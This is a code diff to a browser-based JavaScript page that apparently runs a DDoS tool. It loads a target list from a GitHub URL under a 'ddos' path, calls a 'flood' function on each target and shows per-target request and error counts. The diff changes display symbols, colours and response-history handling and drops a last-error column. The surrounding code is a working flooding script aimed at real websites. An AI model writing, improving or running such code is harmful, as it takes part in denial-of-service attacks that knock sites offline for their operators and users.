@@ -48,8 +48,8 @@
 
     <script>
         const ERROR_SYMBOL = "❌";
-        const SUCCESS_SYMBOL = "🔥"
-        const NO_RESPONSE_SYMBOL = "✨";
+        const SUCCESS_SYMBOL = "✔️"
+        const NO_RESPONSE_SYMBOL = "☠️";
         let targetsURL = 'https://raw.githubusercontent.com/anondevua/anondevua.github.io/main/ddos/targets.txt';
 
         const updateInterval = 500;
@@ -61,24 +61,20 @@
         var statsEl = document.getElementById('stats');
         function printStats() {
             for (var [target, stats] of Object.entries(targetStats)) {
-                stats.last_responses = stats.last_responses.slice(-40)
-                if (!stats.last_responses.includes(ERROR_SYMBOL)) {
-                    stats.last_error = ""
-                }
+                stats.last_responses = stats.last_responses.slice(-20)
             }
             var table_body = Object.entries(targetStats).map(
-                ([target, { number_of_requests, number_of_errored_responses, last_responses, last_error }]) => 
+                ([target, { number_of_requests, number_of_errored_responses, last_responses }]) => 
                 '<tr style="background-color:' + 
-                    (last_responses.includes(ERROR_SYMBOL) ? '#FF0000' : 
-                        last_responses.includes(SUCCESS_SYMBOL) ? '#00FF00' : '#FFFF00') + 
+                    (last_responses.includes(ERROR_SYMBOL) ? '#FF4500' : 
+                        last_responses.includes(SUCCESS_SYMBOL) ? '#3CB371' : '#FFEFD5') + 
                 '"><td>' + target + 
                 '</td><td>' + number_of_requests + 
                 '</td><td>' + number_of_errored_responses + 
                 '</td><td>' + last_responses.join('') + 
-                '</td><td>' + last_error + 
                 '</td></tr>'
             ).join('')
-            statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th><th>Responses</th><th>Last Error</th></tr></thead><tbody>' + table_body + '</tbody></table>'
+            statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th><th>Responses</th></tr></thead><tbody>' + table_body + '</tbody></table>'
         }
         setInterval(printStats, updateInterval);
 
@@ -113,17 +109,16 @@
                                 return;
                             }
                             targetStats[target].number_of_errored_responses++;
-                            targetStats[target].last_responses += ERROR_SYMBOL;
-                            targetStats[target].last_error = error.message;
+                            targetStats[target].last_responses.push(ERROR_SYMBOL);
                         })
                         .then((response) => {
                             if (response) {
                                 if (!response.ok) {
                                     targetStats[target].number_of_errored_responses++;
-                                    targetStats[target].last_responses += NO_RESPONSE_SYMBOL;
+                                    targetStats[target].last_responses.push(NO_RESPONSE_SYMBOL);
                                 }
                             }
-                            targetStats[target].last_responses += SUCCESS_SYMBOL;
+                            targetStats[target].last_responses.push(SUCCESS_SYMBOL);
                             targetStats[target].number_of_requests++;
                         })
                 )
@@ -137,8 +132,7 @@
                     targetStats[target] = {
                         number_of_requests: 0,
                         number_of_errored_responses: 0,
-                        last_responses: [],
-                        last_error: ""
+                        last_responses: []
                     }
                 })
                 targets.map(flood)
